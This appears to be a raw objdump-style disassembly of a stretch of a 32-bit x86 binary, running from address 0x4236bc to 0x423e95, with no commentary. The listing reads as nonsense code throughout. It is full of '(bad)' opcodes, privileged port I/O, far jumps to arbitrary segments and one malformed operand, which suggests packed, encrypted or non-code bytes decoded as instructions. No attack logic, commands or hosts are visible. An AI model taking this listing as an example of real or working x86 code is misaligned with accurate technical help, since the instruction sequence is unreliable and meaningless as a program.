  4236bc:	inc    ecx
  4236bd:	sbb    esi,eax
  4236bf:	daa    
  4236c0:	or     esi,DWORD PTR [esi+ebp*2-0x466a89e3]
  4236c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236c8:	jecxz  0x423737
  4236ca:	fistp  DWORD PTR [edi+0x6e05e5db]
  4236d0:	xchg   BYTE PTR [edx+0xa6b168],cl
  4236d6:	aad    0xcd
  4236d8:	mov    dl,0xfe
  4236da:	shl    DWORD PTR [edi-0x1392d01b],cl
  4236e0:	jecxz  0x423720
  4236e2:	stos   DWORD PTR es:[edi],eax
  4236e3:	add    dl,bl
  4236e5:	mov    eax,0x8158100
  4236ea:	inc    ebx
  4236eb:	aaa    
  4236ec:	test   eax,0x490b5a36
  4236f1:	(bad)  
  4236f2:	in     eax,0x39
  4236f4:	sub    BYTE PTR [edx],dh
  4236f6:	mov    ch,0x1b
  4236f8:	in     eax,dx
  4236f9:	inc    edx
  4236fa:	push   edx
  4236fb:	add    eax,0x5cc08999
  423700:	jnp    0x42371f
  423702:	sub    al,0x2d
  423704:	sub    eax,0x6e47ec2d
  423709:	and    eax,0x4644c2aa
  42370e:	gs popa 
  423710:	pop    ebx
  423711:	outs   dx,BYTE PTR ds:[esi]
  423712:	push   ds
  423713:	jg     0x423727
  423715:	mov    ebp,0xeff42674
  42371a:	fld    TBYTE PTR [esi]
  42371c:	ins    BYTE PTR es:[edi],dx
  42371d:	sbb    edi,DWORD PTR [ecx]
  42371f:	jmp    0x1d58:0x10139e83
  423726:	clc    
  423727:	xor    eax,0x42fcb6ad
  42372c:	scas   eax,DWORD PTR es:[edi]
  42372d:	ss test eax,0x41807a00
  423733:	stos   BYTE PTR es:[edi],al
  423734:	cmp    eax,0x8d85a2d6
  423739:	pop    eax
  42373a:	cmp    DWORD PTR [ebx+0x4d5938e5],esp
  423740:	sub    eax,0xb8eb52d5
  423745:	cmc    
  423746:	jg     0x4237a4
  423748:	mov    ecx,0x61606977
  42374d:	popa   
  42374e:	mov    eax,ds:0x2b800762
  423753:	in     eax,dx
  423754:	rcr    BYTE PTR [eax],1
  423756:	mov    bh,0xb6
  423758:	pop    ebp
  423759:	pop    eax
  42375a:	pop    edx
  42375b:	lds    ebx,FWORD PTR [edx-0xd888cf8]
  423761:	inc    ecx
  423762:	jmp    0x346d1efa
  423767:	pusha  
  423768:	push   0x544ba6ce
  42376d:	and    eax,0x5b754db5
  423772:	sti    
  423773:	dec    ebp
  423774:	pop    ss
  423775:	cmp    DWORD PTR [eax+edi*8-0x18],esi
  423779:	sbb    dl,BYTE PTR [esi-0x4a]
  42377c:	fcmovnbe st,st(6)
  42377e:	add    bl,BYTE PTR cs:[ebx-0x5dee6d77]
  423785:	cmc    
  423786:	sbb    eax,0x2d4bc295
  42378b:	rcr    al,1
  42378d:	push   ss
  42378e:	pop    esi
  42378f:	popa   
  423790:	and    BYTE PTR [edi-0x67],0x33
  423794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423795:	or     ebp,DWORD PTR [ebx+ebx*2-0x45]
  423799:	das    
  42379a:	(bad)
  42379d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42379e:	ins    DWORD PTR es:[edi],dx
  42379f:	xor    eax,0x5a502d4d
  4237a4:	(bad)  
  4237a6:	mov    ds:0x54df472d,al
  4237ab:	push   es
  4237ac:	or     BYTE PTR [edi-0x2569e925],ah
  4237b2:	xor    al,0x8e
  4237b4:	push   es
  4237b5:	fadd   QWORD PTR [ebp-0x7cfc16c3]
  4237bb:	mov    bh,0x85
  4237bd:	(bad)  
  4237be:	ins    DWORD PTR es:[edi],dx
  4237bf:	jae    0x42379e
  4237c1:	repnz mov edx,0xa7b5221f
  4237c7:	adc    eax,0xdc2db4ec
  4237cc:	pop    edx
  4237cd:	sar    DWORD PTR [eax],cl
  4237cf:	int3   
  4237d0:	xlat   BYTE PTR ds:[ebx]
  4237d1:	pop    ebx
  4237d2:	leave  
  4237d3:	add    eax,0x360f8578
  4237d8:	adc    eax,0xb6e2e2dc
  4237dd:	inc    ebp
  4237de:	(bad)  
  4237df:	ins    DWORD PTR es:[edi],dx
  4237e0:	(bad)  [esi+0x580e77c2]
  4237e6:	fld    QWORD PTR [edi+ebx*2-0x10]
  4237ea:	jmp    0x577b544
  4237ef:	mov    bh,0xda
  4237f1:	cmp    BYTE PTR [edx-0x65],al
  4237f4:	inc    esi
  4237f5:	sub    BYTE PTR [edx],cl
  4237f7:	mov    edx,0xb82bb6c8
  4237fc:	mov    al,0xa7
  4237fe:	das    
  4237ff:	lods   al,BYTE PTR ds:[esi]
  423800:	adc    esi,DWORD PTR [ebp+0x53]
  423803:	push   ss
  423804:	and    ah,BYTE PTR [ebx]
  423806:	ins    BYTE PTR es:[edi],dx
  423807:	add    eax,0x919eb768
  42380c:	pop    es
  42380d:	mov    dh,0xb5
  42380f:	je     0x423863
  423811:	(bad)  
  423812:	mov    dh,0xd1
  423814:	cs cmp eax,0x3f8f85c1
  42381a:	popf   
  42381b:	add    eax,0x6ed63cb4
  423820:	ins    DWORD PTR es:[edi],dx
  423821:	in     eax,dx
  423822:	xchg   edx,eax
  423823:	add    eax,0xa32b6bc2
  423828:	pop    eax
  423829:	and    eax,0xb5b15305
  42382e:	fcmovnb st,st(2)
  423830:	jmp    0x42381a
  423832:	gs dec edx
  423834:	add    edi,DWORD PTR [ecx+edi*4+0x4ba708d7]
  42383b:	adc    eax,0xd490396e
  423840:	lods   al,BYTE PTR ds:[esi]
  423841:	jle    0x42385e
  423843:	pop    ebx
  423844:	ret    0x85d5
  423847:	lods   eax,DWORD PTR ds:[esi]
  423848:	lods   eax,DWORD PTR ds:[esi]
  423849:	sub    al,0xaf
  42384b:	sbb    BYTE PTR [edi],bl
  42384d:	jo     0x4238ce
  42384f:	sahf   
  423850:	addr16 push ebx
  423852:	mov    ebx,0xef4d36d1
  423857:	into   
  423858:	mov    dh,0x57
  42385a:	jbe    0x4237e9
  42385c:	jp     0x4238b7
  42385e:	fist   DWORD PTR [esi+0x6b]
  423861:	push   eax
  423862:	stc    
  423863:	in     al,0x8
  423865:	ins    DWORD PTR es:[edi],dx
  423866:	sbb    al,0x3b
  423868:	rol    BYTE PTR [esi],1
  42386a:	mov    eax,0x71c86db0
  42386f:	imul   eax,esi,0xffffffac
  423872:	(bad)  
  423873:	scas   eax,DWORD PTR es:[edi]
  423874:	push   ebp
  423875:	rcl    BYTE PTR [ecx],1
  423877:	mov    bh,0xc2
  423879:	sbb    eax,0xba7c16b
  42387e:	ret    0xae0
  423881:	test   eax,0x4cb0be5d
  423886:	pop    esi
  423887:	push   0x19
  423889:	jbe    0x42388b
  42388b:	xlat   BYTE PTR ds:[ebx]
  42388c:	(bad)  
  42388d:	rcl    BYTE PTR [ebp+0x60b5b8cf],cl
  423893:	arpl   WORD PTR [ebx],si
  423895:	or     DWORD PTR [esi+0x18049555],edi
  42389b:	test   edx,eax
  42389d:	scas   al,BYTE PTR es:[edi]
  42389e:	pop    eax
  42389f:	jae    0x423917
  4238a1:	mov    cl,0x7f
  4238a3:	mov    BYTE PTR [esp+edi*2+0x61],cl
  4238a7:	fld    TBYTE PTR [eax-0x25]
  4238aa:	push   eax
  4238ab:	push   ebx
  4238ac:	or     ebp,DWORD PTR [esi-0x6e]
  4238af:	jle    0x42391e
  4238b1:	cmp    esi,DWORD PTR [esi]
  4238b3:	jns    0x42390b
  4238b5:	add    DWORD PTR [eax+0x62],ebx
  4238b8:	mov    ebp,0x76d26b5e
  4238bd:	sub    eax,0x2c6dbb4
  4238c2:	in     al,0x15
  4238c4:	xor    eax,0xf4a7f324
  4238c9:	call   0xb72fa684
  4238ce:	adc    edx,ebx
  4238d0:	or     esi,0xffffffd7
  4238d3:	xchg   edx,eax
  4238d4:	inc    esp
  4238d5:	xor    bh,BYTE PTR [edi-0x7a473a3]
  4238db:	(bad)
  4238e0:	ins    DWORD PTR es:[edi],dx
  4238e1:	paddb  mm4,mm5
  4238e4:	idiv   BYTE PTR [edx+0x2c]
  4238e7:	fstp   st(2)
  4238e9:	ins    DWORD PTR es:[edi],dx
  4238ea:	pop    edx
  4238eb:	pop    ecx
  4238ec:	jl     0x423927
  4238ee:	mov    DWORD PTR [edx-0x6d704fdb],ebp
  4238f4:	mov    dh,0xb0
  4238f6:	ins    DWORD PTR es:[edi],dx
  4238f7:	ins    BYTE PTR es:[edi],dx
  4238f8:	imul   ecx,ebx,0xdb950a63
  4238fe:	xor    BYTE PTR [bx+0x76],al
  423902:	add    DWORD PTR [edi+0x6b61f8a5],esi
  423908:	cmp    ecx,DWORD PTR [edi+0x72]
  42390b:	in     eax,0xef
  42390d:	fiadd  DWORD PTR [esi]
  42390f:	push   eax
  423910:	fadd   DWORD PTR [ecx-0x6d]
  423913:	sbb    DWORD PTR [esp+eiz*2],ebp
  423916:	lds    ebp,FWORD PTR [edx]
  423918:	pop    esp
  423919:	fcom   DWORD PTR [esi]
  42391b:	pop    esi
  42391c:	test   eax,0xd88852f
  423921:	(bad)
  423925:	mov    al,0xdd
  423927:	xchg   edi,eax
  423928:	push   cs
  423929:	fdivr  QWORD PTR [edx+0x3e]
  42392c:	push   ebx
  42392d:	adc    eax,0xdda1f03e
  423932:	mov    dh,0xe5
  423934:	sub    BYTE PTR [eax],al
  423936:	or     eax,0xfe50bf54
  42393b:	cmc    
  42393c:	clc    
  42393d:	mov    bl,0xeb
  42393f:	dec    ebx
  423940:	mov    bh,0x85
  423942:	ins    DWORD PTR es:[edi],dx
  423943:	sbb    dh,ah
  423945:	pusha  
  423946:	loop   0x423941
  423948:	sbb    ah,BYTE PTR [ecx+edi*8]
  42394b:	jno    0x4238ce
  42394d:	ins    BYTE PTR es:[edi],dx
  42394e:	or     ecx,DWORD PTR [ebx-0x35]
  423951:	add    BYTE PTR [ebx+0x5ee61165],bl
  423957:	clc    
  423958:	ja     0x4239bd
  42395a:	retf   
  42395b:	sbb    eax,0x4aae0bad
  423960:	gs cmp ch,dl
  423963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423964:	add    dh,dl
  423966:	mov    edi,0xbad0b5b
  42396b:	adc    ebp,DWORD PTR [edi+edx*2]
  42396e:	mov    al,ds:0xc425b373
  423973:	mov    dh,0xad
  423975:	push   es
  423976:	mov    ch,0x41
  423978:	imul   esi,ecx,0x70
  42397b:	in     al,dx
  42397c:	xor    BYTE PTR [edx-0x25],0x42
  423980:	imul   eax,DWORD PTR [ebx],0x169296ae
  423986:	and    edi,DWORD PTR [edi-0x4914a9c7]
  42398c:	ins    DWORD PTR es:[edi],dx
  42398d:	mov    ecx,0x81eec5b
  423992:	or     edx,edi
  423994:	loop   0x423a12
  423996:	mov    edx,0x1ac2c6c4
  42399b:	(bad)  
  42399c:	stos   BYTE PTR es:[edi],al
  42399d:	inc    di
  42399f:	mov    BYTE PTR [edx-0x16bd17a0],dh
  4239a5:	push   esi
  4239a6:	fimul  DWORD PTR [ebp+0x40]
  4239a9:	xchg   cl,ch
  4239ab:	jg     0x423990
  4239ad:	les    ebx,FWORD PTR [ebp+0x36]
  4239b0:	sbb    ah,BYTE PTR [eax]
  4239b2:	in     eax,dx
  4239b3:	inc    ebp
  4239b4:	nop
  4239b5:	cld    
  4239b6:	xor    esp,DWORD PTR [eax-0x5f4b9600]
  4239bc:	pop    edi
  4239bd:	jo     0x4239b2
  4239bf:	rol    DWORD PTR [ebp-0x49347a73],1
  4239c5:	push   esp
  4239c6:	cmp    al,0x25
  4239c8:	add    al,0xa1
  4239ca:	push   0xffffff8a
  4239cc:	pusha  
  4239cd:	sti    
  4239ce:	and    ch,BYTE PTR [edi+0x3983f546]
  4239d4:	xchg   ecx,eax
  4239d5:	mov    ?,WORD PTR [esi-0x5d]
  4239d8:	pop    ebp
  4239d9:	stos   BYTE PTR es:[edi],al
  4239da:	out    dx,eax
  4239db:	scas   al,BYTE PTR es:[edi]
  4239dc:	mov    WORD PTR [esi+0x57],cs
  4239df:	es cmp bh,cl
  4239e2:	push   0xabb52e20
  4239e7:	gs push esi
  4239e9:	mov    eax,ds:0x4bf8a021
  4239ee:	sbb    esp,ebp
  4239f0:	aaa    
  4239f1:	mov    edi,0x6b00dd09
  4239f6:	repz push esp
  4239f8:	xor    bl,BYTE PTR [eax-0x4927aaab]
  4239fe:	pop    ebx
  4239ff:	pop    esi
  423a00:	pop    es
  423a01:	popf   
  423a02:	outs   dx,BYTE PTR ds:[esi]
  423a03:	cmp    BYTE PTR [edi+ebx*4-0x4b493936],bh
  423a0a:	mov    al,0x52
  423a0c:	in     eax,dx
  423a0d:	push   edx
  423a0e:	pop    ecx
  423a0f:	je     0x4239ed
  423a11:	stos   BYTE PTR es:[edi],al
  423a12:	idiv   DWORD PTR [edx+ebx*1]
  423a15:	pusha  
  423a16:	jecxz  0x4239de
  423a18:	cmp    edi,DWORD PTR [ecx]
  423a1a:	ins    DWORD PTR es:[edi],dx
  423a1b:	out    0x6,al
  423a1d:	out    0x91,eax
  423a1f:	push   ebp
  423a20:	ins    DWORD PTR es:[edi],dx
  423a21:	push   ebx
  423a22:	jo     0x4239ff
  423a24:	pop    edi
  423a25:	xor    al,bh
  423a27:	xor    BYTE PTR [ecx],ch
  423a29:	mov    BYTE PTR [edx-0x569cdcaa],0x21
  423a30:	mov    BYTE PTR [ebx-0x59f7d5a1],bh
  423a36:	in     al,0xd8
  423a38:	cs jl  0x423aaf
  423a3b:	and    eax,0x5bbd7c22
  423a40:	push   edx
  423a41:	sbb    ch,ah
  423a43:	inc    edx
  423a44:	push   esi
  423a45:	mov    edx,0x2bdeae05
  423a4a:	test   DWORD PTR [edx-0x3d164c9e],eax
  423a50:	rol    dh,cl
  423a52:	into   
  423a53:	dec    eax
  423a54:	lods   eax,DWORD PTR ds:[esi]
  423a55:	clc    
  423a56:	and    DWORD PTR [edi+0x1b],0xffffffa2
  423a5a:	push   eax
  423a5b:	(bad)  [esi+0x72f756cb]
  423a61:	mov    al,0x37
  423a63:	sub    ebp,esp
  423a65:	push   esi
  423a66:	sti    
  423a67:	clc    
  423a68:	mov    ebx,0x2842c2e0
  423a6d:	push   ecx
  423a6e:	cmp    eax,0xd801129d
  423a73:	push   eax
  423a74:	sub    al,0x5f
  423a76:	push   0x17c6a90b
  423a7b:	fadd   QWORD PTR [esi]
  423a7d:	sahf   
  423a7e:	add    BYTE PTR [esi-0x4897240c],dl
  423a84:	adc    dh,BYTE PTR ds:0x4dad7420
  423a8a:	aas    
  423a8b:	dec    eax
  423a8c:	mov    edi,0x6d8db42b
  423a91:	and    BYTE PTR [di],dh
  423a94:	aas    
  423a95:	ins    BYTE PTR es:[edi],dx
  423a96:	jecxz  0x423add
  423a98:	xor    eax,0x42d2c2da
  423a9d:	mov    ch,0x75
  423a9f:	cmp    BYTE PTR [esi],bl
  423aa1:	aaa    
  423aa2:	aad    0xce
  423aa4:	mov    al,0x74
  423aa6:	sub    esi,DWORD PTR [edi+ecx*8+0x3411d794]
  423aad:	out    dx,eax
  423aae:	push   0x1d1b4b4b
  423ab3:	jne    0x423a65
  423ab5:	test   al,0x84
  423ab7:	sub    al,0xe0
  423ab9:	ret    0x5b33
  423abc:	sbb    ecx,ebx
  423abe:	outs   dx,DWORD PTR ds:[esi]
  423abf:	clc    
  423ac0:	es mov ebx,0xd11b5a00
  423ac6:	xchg   ebx,eax
  423ac7:	(bad)  
  423ac8:	sbb    edx,ebx
  423aca:	shr    DWORD PTR [ebp+0x10451b6d],0x26
  423ad1:	or     al,0x53
  423ad3:	mov    ecx,0x2ed30afd
  423ad8:	test   al,0x36
  423ada:	xchg   ebp,eax
  423adb:	sahf   
  423adc:	pop    ebx
  423add:	enter  0x9351,0x59
  423ae1:	ins    BYTE PTR es:[edi],dx
  423ae2:	or     ebx,DWORD PTR [ebx]
  423ae4:	jmp    0x466a:0x23c730e1
  423aeb:	lock xor al,BYTE PTR [esi]
  423aee:	ret    0x5db6
  423af1:	sub    dh,BYTE PTR [ebx+0x5f]
  423af4:	test   eax,0xe0e8b079
  423af9:	jg     0x423af2
  423afb:	fdiv   QWORD PTR [esi-0x9ba7253]
  423b01:	push   edx
  423b02:	xchg   edx,eax
  423b03:	dec    ebp
  423b04:	sub    BYTE PTR [edx-0x11],ah
  423b07:	sbb    al,0x85
  423b09:	jbe    0x423ae6
  423b0b:	sub    BYTE PTR [edx],ah
  423b0d:	jmp    0x55a7:0x6d540888
  423b14:	(bad)  
  423b15:	inc    esp
  423b16:	ins    BYTE PTR es:[edi],dx
  423b17:	fstp   TBYTE PTR ds:0x1a209236
  423b1d:	fchs   
  423b1f:	inc    esi
  423b20:	shr    DWORD PTR [ebp-0x25],1
  423b23:	outs   dx,BYTE PTR ds:[esi]
  423b24:	fist   DWORD PTR [eax]
  423b26:	fisttp QWORD PTR [edx-0x6729bf1a]
  423b2c:	sub    DWORD PTR [ebx],esp
  423b2e:	cmp    edx,DWORD PTR [esi+0x4b]
  423b31:	rol    dl,0x6
  423b34:	add    bh,BYTE PTR [edx]
  423b36:	mov    BYTE PTR [eax],dh
  423b38:	jo     0x423ba0
  423b3a:	(bad)  
  423b3b:	ins    DWORD PTR es:[edi],dx
  423b3c:	pop    ebx
  423b3d:	push   0xb913c183
  423b42:	fsub   DWORD PTR [ecx+0x4254acc9]
  423b48:	fld    TBYTE PTR [esi]
  423b4a:	mov    eax,0xb499cad7
  423b4f:	repnz sub al,0x6e
  423b52:	call   0xdbaff6c4
  423b57:	scas   al,BYTE PTR es:[edi]
  423b58:	(bad)  
  423b59:	sub    WORD PTR [ebp-0x6e],di
  423b5d:	in     al,0x9c
  423b5f:	jmp    0x6d846b41
  423b64:	dec    ebx
  423b65:	or     ecx,DWORD PTR ds:0x80528c1f
  423b6b:	sub    eax,0x376b714f
  423b70:	fidivr DWORD PTR [edi+ebp*1-0x409a2185]
  423b77:	in     al,dx
  423b78:	mov    ch,0x44
  423b7a:	inc    edx
  423b7b:	mov    ah,0x6d
  423b7d:	pop    ss
  423b7e:	sub    ecx,DWORD PTR [edi-0x16]
  423b81:	mov    esp,0x6b127101
  423b86:	(bad)  [ebp-0x463fc973]
  423b8c:	adc    dh,BYTE PTR [ebp+0x7792647a]
  423b92:	push   ss
  423b93:	ss mov dh,0x6d
  423b96:	out    dx,al
  423b97:	das    
  423b98:	enter  0xdda,0x39
  423b9c:	push   ebp
  423b9d:	les    esp,FWORD PTR [edi+0x36d837cb]
  423ba3:	sbb    DWORD PTR [ebp+0x7795a941],0x26fc0093
  423bad:	mov    ebx,0xf5b5b1b4
  423bb2:	and    ecx,DWORD PTR [esi]
  423bb4:	scas   eax,DWORD PTR es:[edi]
  423bb5:	iret   
  423bb6:	popa   
  423bb7:	or     BYTE PTR ds:0x4bb47142,al
  423bbd:	fild   DWORD PTR [esi-0x5e]
  423bc0:	mov    edx,0x8cb3174
  423bc5:	in     al,dx
  423bc6:	sbb    ah,BYTE PTR [ebp-0x30912925]
  423bcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423bcd:	sbb    eax,0xad37d4b3
  423bd2:	mov    bh,0xd0
  423bd4:	cwde   
  423bd5:	ss push ss
  423bd7:	mov    dh,0x1b
  423bd9:	dec    ebx
  423bda:	xchg   esi,eax
  423bdb:	mov    al,0x35
  423bdd:	add    ebp,DWORD PTR [edi+0x36cbc64d]
  423be3:	xchg   esi,eax
  423be4:	sbb    bl,BYTE PTR [edi]
  423be6:	fld    DWORD PTR [esi-0x56]
  423be9:	imul   esi,DWORD PTR [esi+0x68032d95],0xa805da17
  423bf3:	ret    0x8343
  423bf6:	addr16 loope 0x423b98
  423bf9:	xchg   BYTE PTR [ecx+0x61],dh
  423bfc:	test   eax,0x99830fdd
  423c01:	inc    esp
  423c02:	sub    al,0x76
  423c04:	sar    DWORD PTR [edi],0xf4
  423c07:	mov    ds:0xa8a16b71,eax
  423c0c:	dec    ecx
  423c0d:	arpl   WORD PTR [edi],si
  423c0f:	retf   0x4b23
  423c12:	cdq    
  423c13:	fdiv   DWORD PTR [esi-0xef58f4a]
  423c19:	adc    edi,DWORD PTR [eax-0x35]
  423c1c:	sar    DWORD PTR [ebx-0x6b],1
  423c1f:	xchg   edi,eax
  423c20:	sub    ebp,DWORD PTR [esi-0x5b]
  423c23:	pop    eax
  423c24:	sbb    al,0x86
  423c26:	jae    0x423c36
  423c28:	call   0xb1a1:0x76c4f9d7
  423c2f:	imul   DWORD PTR [ecx+0x2485071e]
  423c35:	dec    edx
  423c36:	les    ebx,FWORD PTR [ebx-0x15]
  423c39:	ret    0x1f6
  423c3c:	das    
  423c3d:	ret    0x7c9e
  423c40:	fstp   QWORD PTR [eax-0x45689490]
  423c46:	aam    0xda
  423c48:	outs   dx,BYTE PTR ds:[esi]
  423c49:	xlat   BYTE PTR ds:[ebx]
  423c4a:	push   ss
  423c4b:	or     BYTE PTR [esi-0x7c],ch
  423c4e:	push   ss
  423c4f:	mov    edi,0xb0b04cbc
  423c54:	mov    al,0xd4
  423c56:	les    esi,FWORD PTR [ecx-0x41]
  423c59:	pop    esi
  423c5a:	lods   al,BYTE PTR ds:[esi]
  423c5b:	imul   DWORD PTR [edi+0x6]
  423c5e:	or     dl,BYTE PTR [esi]
  423c60:	mov    edx,0x599bb91f
  423c65:	fidiv  DWORD PTR [edi-0x24f4b5ea]
  423c6b:	add    eax,0xeeb32337
  423c70:	dec    esi
  423c71:	and    BYTE PTR [ecx+0x176f966a],ch
  423c77:	mov    dh,0xd9
  423c79:	pop    ss
  423c7a:	mov    ebx,0x368cf199
  423c7f:	add    BYTE PTR [ebp+0x5c55ad7a],bh
  423c85:	push   0x22
  423c87:	fld    QWORD PTR [esi+esi*4]
  423c8a:	push   eax
  423c8b:	sbb    bl,0xc6
  423c8e:	push   esi
  423c8f:	add    ebx,DWORD PTR [esp]
  423c92:	pop    eax
  423c93:	jmp    0x11a76b67
  423c98:	fdiv   QWORD PTR [esi-0x191993ba]
  423c9e:	mov    dh,0xf2
  423ca0:	mov    ds:0x9bf3f065,al
  423ca5:	push   0xea787dbb
  423caa:	adc    DWORD PTR [edx+esi*2+0x5342b656],eax
  423cb1:	stos   DWORD PTR es:[di],eax
  423cb3:	mov    edx,0x114a6d28
  423cb8:	fld    QWORD PTR [esi]
  423cba:	mov    bh,ch
  423cbc:	test   DWORD PTR [ebp-0x68fe5e8a],eax
  423cc2:	sbb    edx,DWORD PTR [esi+0x433a340e]
  423cc8:	stos   DWORD PTR es:[edi],eax
  423cc9:	sub    eax,0x9c70c2ff
  423cce:	pop    ds
  423ccf:	ins    BYTE PTR es:[edi],dx
  423cd0:	add    BYTE PTR [ecx-0x4e],al
  423cd3:	add    BYTE PTR [ebx-0x52],dl
  423cd6:	das    
  423cd7:	clc    
  423cd8:	add    al,0x5b
  423cda:	push   0x711f6db7
  423cdf:	inc    edx
  423ce0:	or     edi,DWORD PTR [ecx+0x610d0e85]
  423ce6:	mov    esp,0x6171b2da
  423ceb:	fnsave [esi-0x45]
  423cee:	ror    ecx,0x21
  423cf1:	dec    BYTE PTR [ebp+0x5b]
  423cf4:	pop    ss
  423cf5:	fdiv   QWORD PTR [esi]
  423cf7:	mov    edx,0x4437feae
  423cfc:	int    0xef
  423cfe:	lods   eax,DWORD PTR ds:[esi]
  423cff:	call   esp
  423d01:	cs xchg ebp,eax
  423d03:	sbb    eax,DWORD PTR [esp+eax*2-0x27e2dc19]
  423d0a:	jecxz  0x423cdc
  423d0c:	outs   dx,BYTE PTR ds:[esi]
  423d0d:	in     eax,dx
  423d0e:	mov    dh,0x8
  423d10:	not    cl
  423d12:	ss xor esi,edi
  423d15:	add    BYTE PTR ds:0x4bfc0838,0xed
  423d1c:	mov    dh,0xa
  423d1e:	and    ch,BYTE PTR [edx+0x2f02c510]
  423d24:	(bad)  
  423d25:	pop    ecx
  423d26:	add    BYTE PTR [esi],bl
  423d28:	repnz add BYTE PTR [esi-0x4726a4a5],cl
  423d2f:	mov    ah,0xf1
  423d31:	ins    BYTE PTR es:[edi],dx
  423d32:	sbb    BYTE PTR ds:0x137edfff,0x4b
  423d39:	dec    ebx
  423d3a:	or     ebx,DWORD PTR [esi+eax*4]
  423d3d:	sbb    cl,BYTE PTR [ecx+edi*4+0x6d969d2d]
  423d44:	(bad)  [esi]
  423d46:	enter  0x17c6,0x99
  423d4a:	pop    esp
  423d4b:	ins    DWORD PTR es:[edi],dx
  423d4c:	push   ebx
  423d4d:	mov    dl,0x16
  423d4f:	pop    eax
  423d50:	push   0x57c716b7
  423d55:	sbb    DWORD PTR [esi+0x4aa3d1b3],edx
  423d5b:	pop    eax
  423d5c:	fsubr  DWORD PTR [edx]
  423d5e:	frstor [eax+edi*8]
  423d61:	adc    eax,0x67e53d1d
  423d66:	pusha  
  423d67:	pop    ebx
  423d68:	push   ebp
  423d69:	fdivr  DWORD PTR [edx]
  423d6b:	pop    ss
  423d6c:	xor    BYTE PTR [ecx+ebp*2],dl
  423d6f:	dec    esp
  423d70:	cmp    eax,0x5b616345
  423d75:	push   0xffffffa4
  423d77:	mov    bl,0x89
  423d79:	or     ebx,esp
  423d7b:	dec    esp
  423d7c:	arpl   WORD PTR [ebp+0x36],si
  423d7f:	retf   0x6176
  423d82:	inc    eax
  423d83:	(bad)  
  423d84:	sub    al,0xea
  423d86:	sbb    al,BYTE PTR [eax]
  423d88:	push   ds
  423d89:	ja     0x423d18
  423d8b:	ins    DWORD PTR es:[edi],dx
  423d8c:	arpl   bx,bx
  423d8e:	(bad)  
  423d8f:	and    bl,dl
  423d91:	test   al,0xd8
  423d93:	jg     0x423db5
  423d95:	sbb    DWORD PTR [ebx+0x76],ecx
  423d98:	add    DWORD PTR [edi+0x26d60d85],esi
  423d9e:	repnz lahf 
  423da0:	lods   al,BYTE PTR ds:[esi]
  423da1:	xor    eax,ebx
  423da3:	out    0xbb,eax
  423da5:	ins    DWORD PTR es:[edi],dx
  423da6:	xchg   ecx,eax
  423da7:	sub    ebx,ebp
  423da9:	cwde   
  423daa:	sub    al,0x17
  423dac:	mov    dl,0x11
  423dae:	inc    ecx
  423daf:	outs   dx,BYTE PTR ds:[esi]
  423db0:	sub    al,0xb4
  423db2:	ins    DWORD PTR es:[edi],dx
  423db3:	int3   
  423db4:	mov    ecx,0x5fb2cb37
  423db9:	push   ds
  423dba:	jo     0x423d8c
  423dbc:	fcmovnu st,st(0)
  423dbe:	ss push ds
  423dc0:	(bad)  
  423dc1:	xchg   ecx,eax
  423dc2:	nop
  423dc3:	ret    0x39b3
  423dc6:	add    ebx,edi
  423dc8:	jno    0x423e2b
  423dca:	fcmovu st,st(2)
  423dcc:	ins    DWORD PTR es:[edi],dx
  423dcd:	cmp    al,0x14
  423dcf:	aaa    
  423dd0:	dec    esi
  423dd1:	sbb    ch,BYTE PTR [edx+0x2edb920a]
  423dd7:	or     BYTE PTR [eax+0x48eb0cf9],bh
  423ddd:	mov    dl,BYTE PTR [eax-0x5252253e]
  423de3:	(bad)  [eax-0x56]
  423de6:	repz icebp 
  423de8:	and    eax,0x34e67423
  423ded:	mov    ch,0x62
  423def:	imul   esi,DWORD PTR [edi+0x7f404106],0x3e
  423df6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423df7:	sahf   
  423df8:	and    DWORD PTR [ebx],ecx
  423dfa:	ins    DWORD PTR es:[edi],dx
  423dfb:	ins    DWORD PTR es:[edi],dx
  423dfc:	sub    eax,0x186150aa
  423e01:	test   eax,0xdbb1e044
  423e06:	push   edx
  423e07:	mov    ebx,0x98a5d16d
  423e0c:	pushf  
  423e0d:	fidiv  WORD PTR [ecx+0x50]
  423e10:	dec    esp
  423e11:	in     al,dx
  423e12:	add    dh,BYTE PTR [ecx+0x4b528d0]
  423e18:	xlat   BYTE PTR ds:[ebx]
  423e19:	or     BYTE PTR [esi-0x7e],dl
  423e1c:	mov    bh,0x6d
  423e1e:	mov    cl,0x7d
  423e20:	mov    ch,0x5a
  423e22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e23:	loopne 0x423e47
  423e25:	sbb    al,BYTE PTR ds:0xdb0ba463
  423e2b:	(bad)  
  423e2c:	mov    dh,0xd7
  423e2e:	mov    bl,BYTE PTR [ebx+0x1b4b068c]
  423e34:	and    eax,0x6b5b38e2
  423e39:	jecxz  0x423e4d
  423e3b:	adc    BYTE PTR [eax-0x59200972],al
  423e41:	ds nop
  423e43:	ins    DWORD PTR es:[edi],dx
  423e44:	dec    ebx
  423e45:	pop    ebx
  423e46:	pop    ebx
  423e47:	jg     0x423ea7
  423e49:	mov    eax,0xbf5983e
  423e4e:	shr    ch,0xc2
  423e51:	(bad)  
  423e52:	mov    dh,0x7a
  423e54:	inc    ebp
  423e55:	mov    dh,0xa1
  423e57:	xor    DWORD PTR [ecx-0x1e],ebx
  423e5a:	fstp   st(1)
  423e5c:	mov    ecx,0xb6db5b4b
  423e61:	inc    edi
  423e62:	fwait
  423e63:	sbb    BYTE PTR [edx+esi*8+0x26],al
  423e67:	add    eax,0xd0208607
  423e6c:	outs   dx,BYTE PTR ds:[esi]
  423e6d:	sbb    esi,DWORD PTR [ebp+ebp*2+0x77d25f56]
  423e74:	std    
  423e75:	xchg   ebx,eax
  423e76:	xor    eax,0xad1ae0b0
  423e7b:	aaa    
  423e7c:	xchg   ecx,eax
  423e7d:	jnp    0x423e5c
  423e7f:	hlt    
  423e80:	test   al,0x6c
  423e82:	push   esp
  423e83:	mov    eax,0xbd01fb4
  423e88:	sub    BYTE PTR [ebx+0x2ddbd613],ah
  423e8e:	fstp   st(2)
  423e90:	inc    edx
  423e91:	add    esi,DWORD PTR [ebx-0x68]
  423e94:	in     al,dx
  423e95:	pop    esp
